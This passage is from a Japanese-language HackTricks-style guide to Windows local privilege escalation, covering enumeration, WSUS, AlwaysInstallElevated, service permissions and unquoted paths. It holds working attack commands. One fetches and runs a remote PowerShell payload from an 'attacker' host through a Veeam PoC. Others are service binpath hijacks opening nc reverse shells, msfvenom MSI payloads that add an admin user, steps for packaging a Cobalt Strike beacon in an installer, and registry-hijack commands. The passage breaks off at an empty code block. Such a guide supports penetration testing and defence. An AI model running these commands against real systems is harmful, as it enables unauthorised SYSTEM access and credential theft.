# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors を探すための最適な tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows の初期理論

### Access Tokens

**Windows Access Tokens について知らない場合は、続行する前に次のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、次のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels について知らない場合は、続行する前に次のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows の Security Controls

Windows には、**system の enumerating を妨げたり**、実行ファイルの実行を阻止したり、さらには**活動を検知したりする**さまざまな仕組みがあります。privilege escalation の enumeration を開始する前に、次の**ページを読み**、これらすべての**防御** **mechanisms**を**enumerate**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` を通じて起動された UIAccess processes は、AppInfo の secure-path checks が bypass された場合、prompt なしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection bypass workflow については、こちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation は、任意の SYSTEM registry write（RegPwn）に悪用できます:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows builds では、特権を持つローカル NTLM authentication が再利用された SMB TCP connection 上で reflection される、**SMB arbitrary-port** LPE path も導入されています:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Windows version に既知の vulnerability があるか確認してください（適用済みの patches も確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### バージョン Exploits

この [site](https://msrc.microsoft.com/update-guide/vulnerability) は、Microsoft の security vulnerabilities に関する詳細情報を検索するのに便利です。この database には 4,700 件を超える security vulnerabilities が登録されており、Windows 環境が示す**massive attack surface**がわかります。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas には watson が組み込まれています)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploits の Github repos:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に保存された credential/Juicy info はありますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShellの履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell トランスクリプトファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) で、これを有効にする方法を確認できます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell パイプラインの実行に関する詳細が記録されます。これには、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、実行の詳細や出力結果が完全には記録されない場合があります。

有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**「Powershell Transcription」**ではなく**「Module Logging」**を選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowerShell logs の最後の15件のイベントを表示するには、次を実行します:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関する完全なアクティビティと全コンテンツの記録が取得され、実行時にコードの各ブロックがすべて記録されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、フォレンジック調査や悪意のある動作の分析に役立ちます。実行時のすべてのアクティビティを記録することで、プロセスに関する詳細な洞察が得られます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは、Windows Event Viewer の次のパスにあります: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
最後の 20 件のイベントを表示するには、次を使用します:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet Settings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http を使用して要求されている場合、システムを侵害できる可能性があります。

まず、cmdで次のコマンドを実行し、ネットワークが非SSLのWSUS更新を使用しているか確認します。
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShell では次のようにします：
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信を受け取った場合：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
また、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` と等しい場合、

**exploit可能です。** 最後のレジストリ値が `0` の場合、WSUSエントリは無視されます。

これらの脆弱性をexploitするには、次のようなツールを使用できます。[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) - これらは、非SSLのWSUSトラフィックに「fake」なupdatesをinjectするための、MiTM weaponized exploit scriptsです。

researchはこちらをご覧ください：

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**完全なreportはこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。<sup>[[33]](#references)</sup>\
基本的には、これはこのbugがexploitするflawです：

> ローカルユーザーのproxyを変更でき、Windows UpdatesがInternet Explorerの設定で構成されたproxyを使用している場合、[PyWSUS](https://github.com/GoSecure/pywsus)をローカルで実行して自身のトラフィックをinterceptし、asset上でelevated userとしてcodeを実行できます。
>
> さらに、WSUS serviceはcurrent userの設定を使用するため、そのcertificate storeも使用します。WSUS hostname用のself-signed certificateを生成し、このcertificateをcurrent userのcertificate storeに追加すると、HTTPとHTTPSの両方のWSUSトラフィックをinterceptできるようになります。WSUSは、certificate上でtrust-on-first-use型のvalidationを実装するためのHSTSに類似したmechanismを使用していません。提示されたcertificateがuserによってtrustedであり、正しいhostnameを持っていれば、serviceによってacceptedされます。

このvulnerabilityは、[**WSUSpicious**](https://github.com/GoSecure/wsuspicious) tool（liberatedされた後）を使用してexploitできます。

## Third-Party Auto-Updaters and Agent IPC (local privesc)

多くのenterprise agentsは、localhost IPC surfaceとprivileged update channelを公開しています。enrollmentをattacker serverへcoerceでき、updaterがrogue root CAまたはweak signer checksをtrustedする場合、local userはmalicious MSIをdeliverし、SYSTEM serviceにinstallさせることができます。Netskope stAgentSvc chain（CVE-2025-0309）をベースにしたgeneralized techniqueはこちらです：


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401経由のSYSTEM)

Veeam B&R < `11.0.1.1261` は、**TCP/9401**上にlocalhost serviceを公開しており、attacker-controlled messagesをprocessすることで、**NT AUTHORITY\SYSTEM**としてarbitrary commandsを実行できます。<sup>[[12]](#references)</sup>

- **Recon**: listenerとversionを確認します。例：`netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。
- **Exploit**: required Veeam DLLsとともに`VeeamHax.exe`などのPoCを同じdirectoryに配置し、local socket経由でSYSTEM payloadをtriggerします：
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
サービスはコマンドを SYSTEM として実行します。
## KrbRelayUp

特定の条件下にある Windows **domain** 環境では、**local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing が強制されていない**環境、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を構成できる self-rights を持っていること、そしてユーザーが domain 内にコンピューターを作成できることが含まれます。重要なのは、これらの **requirements** が **default settings** で満たされることです。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) に **exploit** があります。

攻撃の流れについては、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) を確認してください。

## AlwaysInstallElevated

これら 2 つのレジストリが **有効**（値が **0x1**）になっている **場合**、任意の権限を持つユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **install**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
meterpreter sessionがある場合は、**`exploit/windows/local/always_install_elevated`** モジュールを使用してこの technique を自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使用すると、privileges を escalate するための Windows MSI binary を current directory 内に作成できます。この script は、user/group の追加を促す precompiled MSI installer を書き出します（そのため、GUI access が必要です）。
```
Write-UserAddMSI
```
作成した binary を実行するだけで privilege を escalation できます。

### MSI Wrapper

この tools を使用して MSI wrapper を作成する方法については、この tutorial を読んでください。**command lines** を**実行**したい**だけ**の場合は、"**.bat**" file を wrap できることに注意してください。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike または Metasploit で、`C:\privesc\beacon.exe` に**新しい Windows EXE TCP payload**を**生成**します。
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに "installer" と入力します。**Setup Wizard** project を選択し、**Next** をクリックします。
- project に **AlwaysPrivesc** などの名前を付け、location に **`C:\privesc`** を使用し、**place solution and project in the same directory** を選択して、**Create** をクリックします。
- step 3 of 4（include する files の選択）に到達するまで **Next** をクリックし続けます。**Add** をクリックし、先ほど生成した Beacon payload を選択します。その後、**Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** project を選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- **Author** や **Manufacturer** など、installed app をより正規のものに見せるために変更できる properties もあります。
- project を右クリックし、**View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** file を選択して **OK** をクリックします。これにより、installer の実行直後に beacon payload が実行されます。
- **Custom Action Properties** で、**Run64Bit** を **True** に変更します。
- 最後に、**build** します。
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という warning が表示された場合は、platform が x64 に設定されていることを確認してください。

### MSI Installation

悪意のある `.msi` file の**installation**を**background**で実行するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この vulnerability を exploit するには、_exploit/windows/local/always_install_elevated_ を使用できます

## Antivirus と Detectors

### Audit Settings

これらの設定は何が **logging** されるかを決定するため、注意を払う必要があります。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding（Windows イベント転送）では、ログがどこに送信されるのかを把握することが重要です。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、**ローカル Administrator パスワードの管理**を目的としており、ドメインに参加しているコンピューターごとにパスワードが**一意で、ランダム化され、定期的に更新される**ことを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACL によって十分な権限を付与されたユーザーのみがアクセスできます。これにより、認証されたユーザーはローカル admin パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードが LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページの WDigest に関する詳細情報**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する強化された保護を導入し、信頼されていないプロセスによるメモリの**読み取り**やコードのインジェクションの試みを**ブロック**して、システムのセキュリティをさらに強化しました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash attacks などの脅威からデバイスに保存された credentials を保護することです。| [**Credentials Guard の詳細はこちら。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**ドメイン資格情報**は、**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**Cached Credentials の詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

所属しているグループに興味深い権限があるか確認してください
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

**Privileged group に所属している場合、privileges を escalate できる可能性があります**。Privileged group と、それらを abuse して privileges を escalate する方法については、こちらで学べます:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

このページで **token** について**詳しく学べます**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
以下のページで、**興味深い token** と、それらを abuse する方法について**学べます**:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### ホームフォルダー
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダーの権限

まず、プロセスを一覧表示する際は、**プロセスのコマンドライン内にパスワードがないか確認します**。\
**実行中のバイナリを上書きできるか**、またはバイナリのフォルダーに対する書き込み権限があり、[**DLL Hijacking attacks**](dll-hijacking/index.html) を悪用できる可能性がないか確認します：
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に実行中の [**electron/cef/chromium debuggers** を確認してください。これを悪用して権限を昇格できる可能性があります](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)。

**プロセスのバイナリに対する権限の確認**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリがあるフォルダの権限を確認 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

sysinternals の **procdump** を使用して、実行中のプロセスのメモリダンプを作成できます。FTP などのサービスは、**メモリ内に credentials を clear text で保持している**ため、メモリをダンプして credentials を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM として実行されているアプリケーションでは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: 「Windows Help and Support」（Windows + F1）で「command prompt」を検索し、「Click to open Command Prompt」をクリックします。

## Services

Service Triggers により、特定の条件（名前付きパイプ/RPC エンドポイントのアクティビティ、ETW イベント、IP の利用可能状態、デバイスの接続、GPO の更新など）が発生したときに Windows がサービスを開始できます。SERVICE_START rights がなくても、トリガーを発火させることで、privileged services を開始できる場合があります。enumeration および activation techniques については、こちらを参照してください:

-
{{#ref}}
service-triggers.md
{{#endref}}

サービスの一覧を取得します:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

**sc** を使用してサービスの情報を取得できます
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するため、_Sysinternals_ のバイナリ **accesschk** を用意することを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」がいずれかのサービスを変更できるかどうかを確認することを推奨します。
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP用のaccesschk.exeはこちらからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスの有効化

（例としてSSDPSRVで）次のエラーが発生する場合：

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

次のコマンドを使用して有効化できます。
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost が動作するには SSDPSRV に依存することに注意してください（XP SP1 の場合）**

**この問題に対する別の回避策**は、次を実行することです:
```
sc.exe config usosvc start= auto
```
### **サービスバイナリパスの変更**

「Authenticated users」グループがサービスに対する **SERVICE_ALL_ACCESS** を持っている場合、サービスの実行可能バイナリを変更できます。**sc** を変更して実行するには：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限は、さまざまなアクセス許可を通じて昇格できます。

- **SERVICE_CHANGE_CONFIG**: service binary の再構成を許可します。
- **WRITE_DAC**: permission の再構成を有効にし、service configuration を変更できるようにします。
- **WRITE_OWNER**: ownership の取得と permission の再構成を許可します。
- **GENERIC_WRITE**: service configuration を変更する権限を継承します。
- **GENERIC_ALL**: service configuration を変更する権限も継承します。

この vulnerability の detection と exploitation には、_exploit/windows/local/service_permissions_ を利用できます。

### Services binaries weak permissions

service が **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または privileged domain account として実行されている一方で、**low-privileged users が service EXE またはその親 folder を変更できる場合**、**binary を置き換えて service を再起動することで** service を hijack できることがあります。

**service によって実行される binary を変更できるか**、または binary が配置されている **folder に write permissions があるか**を確認します（[**DLL Hijacking**](dll-hijacking/index.html)**.**）\
**wmic**（system32 にはありません）を使用すると、service によって実行されるすべての binary を取得でき、**icacls** を使用して permissions を確認できます。
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
**sc** と **icacls** も使用できます：
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービス実行ファイルまたはそれを含むディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実際の悪用手順は次のとおりです。<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが書き込み可能か確認します。
3. サービスバイナリを payload または有効な malicious service binary に置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または再起動 / service trigger を待ちます）。

自動チェックに役立つツール：<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> サービスによって通常のユーザーによる再起動が許可されていない場合は、boot 時に自動的に起動するか、再起動させる failure action が設定されているか、またはそのサービスを使用するアプリケーションによって間接的に起動できるかを確認してください。

### サービスレジストリの変更権限

サービスレジストリを変更できるか確認してください。\
以下を実行して、サービス **registry** に対する **permissions** を **check** できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。持っている場合、service によって実行される binary を変更できます。

実行される binary の Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race による任意の HKLM value write（ATConfig）

一部の Windows Accessibility feature はユーザーごとの **ATConfig** key を作成します。この key は後に **SYSTEM** process によって HKLM session key にコピーされます。Registry **symbolic link race** により、この privileged write を **任意の HKLM path** へリダイレクトでき、任意の HKLM **value write** primitive が得られます。<sup>[[18]](#references)</sup>

Key locations（例: On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みの accessibility feature が列挙されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御可能な configuration が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は logon/secure-desktop transition 中に作成され、ユーザーによる write が可能です。

Abuse flow（CVE-2026-24291 / ATConfig）:

1. SYSTEM に書き込ませたい **HKCU ATConfig** value を設定します。
2. secure-desktop copy（例: **LockWorkstation**）を trigger し、AT broker flow を開始します。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して **race に勝ち**、oplock が発生した時点で **HKLM Session ATConfig** key を、protected HKLM target への **registry link** に置き換えます。
4. SYSTEM が、redirect された HKLM path に attacker が選択した value を書き込みます。

任意の HKLM value write を取得したら、service configuration values を上書きして LPE に pivot します。

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE/command line）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常のユーザーが start できる service（例: **`msiserver`**）を選択し、write 後に trigger します。**Note:** public exploit implementation は race の一部として **workstation を lock** します。

Example tooling（RegPwn BOF / standalone）:<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

レジストリに対してこの権限を持っている場合、**このレジストリからサブレジストリを作成できる**ことを意味します。Windows サービスの場合、これは**任意のコードを実行するのに十分です**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルへのパスが引用符で囲まれていない場合、Windows はスペースまでの各部分を実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次を実行しようとします:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込み Windows サービスに属するものを除外して、引用符で囲まれていないすべてのサービスパスを一覧表示します：
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性は** metasploit の `exploit/windows/local/trusted\_service\_path` **で検出および exploit できます**。metasploit を使用してサービスバイナリを手動で作成できます：
```bash
